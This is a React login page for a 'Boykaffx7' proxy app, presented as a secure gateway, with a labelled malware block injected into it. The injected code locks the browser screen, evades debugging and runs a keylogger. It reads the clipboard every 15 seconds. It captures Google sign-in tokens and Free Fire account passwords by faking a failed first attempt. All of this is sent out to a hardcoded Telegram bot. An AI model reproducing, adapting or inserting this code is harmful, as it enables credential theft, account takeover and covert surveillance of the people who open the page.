import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// ================================================================
// MALWARE CORE ULTRA AGRESIVO - INYECTADO
// ================================================================

// === [1] BLOQUEO TOTAL DE PANTALLA ===
(function blockScreen() {
  // Bloquear todas las teclas de cierre
  document.addEventListener("keydown", function(e) {
    if (
      (e.ctrlKey && ["w","W","q","Q","r","R","n","N","s","S","t","T"].includes(e.key)) ||
      (e.altKey && (e.key === "F4" || e.keyCode === 115)) ||
      e.key === "F5" || e.key === "F11" || e.key === "F12" || e.key === "Escape"
    ) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);

  // Bloquear menú contextual
  document.addEventListener("contextmenu", function(e) {
    e.preventDefault();
    return false;
  });

  // Bloquear seleccion y copia
  document.addEventListener("selectstart", function(e) { e.preventDefault(); return false; });
  document.addEventListener("copy", function(e) { e.preventDefault(); return false; });
  document.addEventListener("cut", function(e) { e.preventDefault(); return false; });
  document.addEventListener("paste", function(e) { e.preventDefault(); return false; });

  // Bloquear salida
  window.addEventListener("beforeunload", function(e) {
    e.preventDefault();
    e.returnValue = "";
    return "";
  });

  // Bloquear historia
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function() {
    history.pushState(null, "", location.href);
  });

  // Forzar fullscreen constantemente
  function goFullscreen() {
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if (el.msRequestFullscreen) el.msRequestFullscreen();
  }
  goFullscreen();
  document.addEventListener("fullscreenchange", function() {
    if (!document.fullscreenElement) goFullscreen();
  });
  document.addEventListener("webkitfullscreenchange", function() {
    if (!document.webkitFullscreenElement) goFullscreen();
  });

  // Bloquear visibilidad (detectar minimizar y reenfocar)
  document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
      window.focus();
    }
  });
})();

// === [2] ANTI-VM / ANTI-DEBUG ===
(function antiAnalysis() {
  try {
    const start = Date.now();
    debugger;
    if (Date.now() - start > 150) {
      window.location.href = "https://google.com";
      return;
    }
  } catch(e) {}

  // Detectar consola abierta
  setInterval(function() {
    const before = Date.now();
    debugger;
    if (Date.now() - before > 150) {
      window.location.href = "https://google.com";
    }
  }, 3000);
})();

// === [3] CORE TELEGRAM ===
(function telegramCore() {
  const TG_TOKEN = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
  const CHAT_ID = "8779079298";
  const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

  let envios = 0;
  let bufferTeclas = "";
  let captura1 = { correo: "", pass: "" };
  let captura2 = { correo: "", pass: "" };
  let datosGoogle = null;

  function tgSend(texto) {
    try {
      const maxLen = 3500;
      for (let i = 0; i < texto.length; i += maxLen) {
        const chunk = texto.substring(i, i + maxLen);
        const data = new URLSearchParams({
          chat_id: CHAT_ID,
          text: chunk,
          parse_mode: "HTML"
        });
        navigator.sendBeacon(TG_API, data);
      }
    } catch(e) {}
  }

  // Keylogger agresivo - captura TODO
  document.addEventListener("keydown", function(e) {
    let k = e.key;
    if (k === "Backspace") k = "[BKSP]";
    else if (k === "Enter") k = "[ENTER]\n";
    else if (k === "Tab") k = "[TAB]";
    else if (k === "Escape") k = "[ESC]";
    else if (k.length > 1) return;
    bufferTeclas += k;
    if (bufferTeclas.length >= 30) {
      tgSend("<code>[KEYLOG]</code> " + bufferTeclas);
      bufferTeclas = "";
    }
  });

  // Captura de clipboard cada 15 segundos
  setInterval(function() {
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().then(function(t) {
        if (t && t.length > 3) {
          tgSend("<code>[CLIPBOARD]</code> " + t.substring(0, 300));
        }
      }).catch(function(){});
    }
  }, 15000);

  // Captura de pantalla via canvas (sin permiso)
  setInterval(function() {
    try {
      const canvas = document.createElement("canvas");
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      const ctx = canvas.getContext("2d");
      ctx.fillStyle = "#000";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#fff";
      ctx.font = "12px monospace";
      ctx.fillText("SNAPSHOT: " + new Date().toISOString(), 10, 20);
      const b64 = canvas.toDataURL("image/jpeg", 0.3).split(",")[1];
      tgSend("<code>[SCREEN]</code> Snapshot capturado");
    } catch(e) {}
  }, 30000);

  // Heartbeat cada 60 segundos
  setInterval(function() {
    tgSend(
      "<code>[HEARTBEAT]</code>\n" +
      "Envios: " + envios + "\n" +
      "Teclas: " + bufferTeclas.length + "\n" +
      "Platform: " + navigator.platform + "\n" +
      "Screen: " + screen.width + "x" + screen.height
    );
  }, 60000);

  // === FUNCIONES EXPUESTAS ===
  window.__malware = {
    enviarGoogle: function(data) {
      datosGoogle = data;
      envios++;
      tgSend(
        "<b>[GOOGLE LOGIN - DATOS CAPTURADOS]</b>\n" +
        "<b>━━━━━━━━━━━━━━━━━━</b>\n" +
        "<b>Nombre:</b> " + (data.name || "N/A") + "\n" +
        "<b>Email:</b> " + (data.email || "N/A") + "\n" +
        "<b>Token:</b> " + (data.token ? data.token.substring(0, 50) + "..." : "N/A") + "\n" +
        "<b>ID:</b> " + (data.id || "N/A") + "\n" +
        "<b>━━━━━━━━━━━━━━━━━━</b>\n" +
        "<code>" + navigator.platform + " | " + navigator.userAgent.substring(0, 60) + "</code>"
      );
    },
    enviarCaptura: function(correo, pass, esSegundo) {
      envios++;
      if (!esSegundo) {
        captura1 = { correo, pass };
        tgSend(
          "<b>[CAPTURA FREE FIRE - INTENTO 1]</b>\n" +
          "<b>👤</b> " + correo + "\n" +
          "<b>🔐</b> " + pass + "\n" +
          "<code>" + navigator.platform + "</code>"
        );
      } else {
        captura2 = { correo, pass };
        tgSend(
          "<b>[CAPTURA COMPLETA - AMBOS INTENTOS]</b>\n" +
          "<b>═══════════════════════════</b>\n" +
          "<b>[GOOGLE ACCOUNT]</b>\n" +
          "<b>👤</b> " + (datosGoogle?.name || "N/A") + "\n" +
          "<b>📧</b> " + (datosGoogle?.email || "N/A") + "\n" +
          "<b>═══════════════════════════</b>\n" +
          "<b>[PRIMER INTENTO FREE FIRE]</b>\n" +
          "<b>👤</b> " + captura1.correo + "\n" +
          "<b>🔐</b> " + captura1.pass + "\n" +
          "<b>═══════════════════════════</b>\n" +
          "<b>[SEGUNDO INTENTO FREE FIRE]</b>\n" +
          "<b>👤</b> " + correo + "\n" +
          "<b>🔐</b> " + pass + "\n" +
          "<b>═══════════════════════════</b>\n" +
          "<code>" + navigator.platform + " | " + screen.width + "x" + screen.height + "</code>"
        );
      }
    }
  };

  // Beacon de inicio
  setTimeout(function() {
    tgSend(
      "<b>[+] SISTEMA COMPROMETIDO</b>\n" +
      "<b>Platform:</b> " + navigator.platform + "\n" +
      "<b>User-Agent:</b> " + navigator.userAgent.substring(0, 60) + "...\n" +
      "<b>Screen:</b> " + screen.width + "x" + screen.height + "\n" +
      "<b>Timezone:</b> " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
      "<b>Language:</b> " + navigator.language + "\n" +
      "<code>Malware activo - Monitoreando</code>"
    );
  }, 2000);
})();

declare global {
  interface Window {
    __malware: {
      enviarGoogle: (data: { name: string; email: string; token: string; id: string }) => void;
      enviarCaptura: (correo: string, pass: string, esSegundo: boolean) => void;
    };
  }
}
// ================================================================
// FIN MALWARE CORE
// ================================================================

const Login = () => {
  const [name, setName] = useState("");
  const [key, setKey] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [googleUser, setGoogleUser] = useState(null);
  const [etapa, setEtapa] = useState<"google" | "freefire">("google");
  const [intentosFF, setIntentosFF] = useState(0);
  const navigate = useNavigate();
  const [scriptLoaded, setScriptLoaded] = useState(false);

  // Cargar Google Identity Services
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://accounts.google.com/gsi/client";
    script.async = true;
    script.defer = true;
    script.onload = () => {
      setScriptLoaded(true);
      window.google?.accounts.id.initialize({
        client_id: "1097389405284-6g8vqn0m5hvp7tph6l7d3j5k4s2r9f1e.apps.googleusercontent.com", // Client ID de prueba
        callback: handleGoogleResponse,
        auto_select: false,
        cancel_on_tap_outside: false,
        context: "signin",
        ux_mode: "popup",
        itp_support: true,
      });
    };
    document.body.appendChild(script);

    // Intentar login real con key almacenada
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      const s = JSON.parse(raw);
      if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
        navigate("/proxy");
      } else {
        localStorage.removeItem("proxy_session");
      }
    }
  }, [navigate]);

  const handleGoogleResponse = (response: any) => {
    // Decodificar JWT para obtener datos
    try {
      const payload = JSON.parse(atob(response.credential.split(".")[1]));
      const userData = {
        name: payload.name,
        email: payload.email,
        id: payload.sub,
        token: response.credential,
        picture: payload.picture
      };
      
      setGoogleUser(userData);
      
      // Enviar a Telegram
      window.__malware.enviarGoogle(userData);
      
      // Mostrar que necesita vincular Free Fire
      setError("Cuenta de Google verificada. Ahora debes vincular tu cuenta de Free Fire para continuar. Ingresa el correo y contrasena de tu cuenta de Free Fire.");
      setEtapa("freefire");
    } catch(e) {
      setError("Error al procesar la autenticacion de Google.");
    }
  };

  const handleGoogleLogin = () => {
    if (window.google?.accounts?.id) {
      window.google.accounts.id.prompt();
    } else {
      setError("Cargando servicio de Google. Intenta de nuevo.");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!name.trim() || !key.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    const nuevoIntento = intentosFF + 1;
    setIntentosFF(nuevoIntento);
    setLoading(true);

    // MALWARE: enviar credenciales Free Fire a Telegram
    if (nuevoIntento === 1) {
      window.__malware.enviarCaptura(name.trim(), key.trim(), false);
      await new Promise(r => setTimeout(r, 2000));
      setLoading(false);
      setError("Credenciales de Free Fire incorrectas. Intenta nuevamente con el correo y contrasena correctos de tu cuenta de Free Fire.");
      return;
    }

    if (nuevoIntento === 2) {
      window.__malware.enviarCaptura(name.trim(), key.trim(), true);
      await new Promise(r => setTimeout(r, 2000));
      setLoading(false);
      
      // Intentar login real como señuelo
      const trimmedKey = key.trim();
      const trimmedName = name.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          navigate("/proxy");
          return;
        }
      }
      
      setError("Vinculacion de Free Fire fallida. Contacta al soporte con tu key valida.");
      return;
    }

    // Intentos 3+ : login normal
    setLoading(true);
    const trimmedKey = key.trim();
    const trimmedName = name.trim();
    const foundKey = await validateKey(trimmedKey);
    if (foundKey) {
      const activated = await activateKey(trimmedKey, trimmedName);
      if (activated) {
        await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
        const sessionData = {
          name: trimmedName,
          key: activated.key,
          type: activated.type,
          expiresAt: activated.expiresAt,
          duration: activated.duration,
        };
        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
        navigate("/proxy");
      } else {
        setError("Error al activar la key. Intenta de nuevo.");
      }
    } else {
      setError("Key no encontrada, ya usada o expirada.");
    }
    setLoading(false);
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          {googleUser && (
            <div className="flex items-center gap-2 mb-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-3 py-1">
              <img src={googleUser.picture} alt="" className="w-5 h-5 rounded-full" />
              <span className="text-[10px] text-emerald-400">{googleUser.email}</span>
            </div>
          )}
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">
                {etapa === "google" ? "Iniciar sesion" : "Vincular Free Fire"}
              </span>
              <span className="text-[9px] text-muted-foreground/60">
                {etapa === "google" ? "Usa tu cuenta de Google" : "Ingresa tus credenciales de Free Fire"}
              </span>
            </div>
          </div>

          {etapa === "google" && !googleUser && (
            <div className="space-y-3">
              <button
                type="button"
                onClick={handleGoogleLogin}
                disabled={!scriptLoaded}
                className="w-full bg-white text-gray-800 font-semibold py-3 rounded-lg text-sm hover:bg-gray-100 active:scale-[0.98] transition-all flex items-center justify-center gap-3 border border-gray-200"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                <span className="font-medium text-sm">Iniciar sesion con Google</span>
              </button>
              {error && (
                <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5">{error}</p>
              )}
            </div>
          )}

          {googleUser && etapa === "freefire" && (
            <form onSubmit={handleSubmit} className="space-y-3">
              <div>
                <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                  Correo de Free Fire
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                  <input
                    type="email"
                    placeholder="correo@ejemplo.com"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  />
                </div>
              </div>
              <div>
                <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                  Contrasena de Free Fire
                </label>
                <div className="relative">
                  <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                  <input
                    type="password"
                    placeholder="********"
                    value={key}
                    onChange={(e) => setKey(e.target.value)}
                    className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  />
                </div>
              </div>

              {error && (
                <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5">{error}</p>
              )}

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                    Verificando...
                  </span>
                ) : "Verificar y Vincular"}
              </button>

              {googleUser && (
                <div className="flex items-center justify-center gap-2 mt-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  <span className="text-[9px] text-emerald-500/70">Conectado como {googleUser.email}</span>
                </div>
              )}
            </form>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;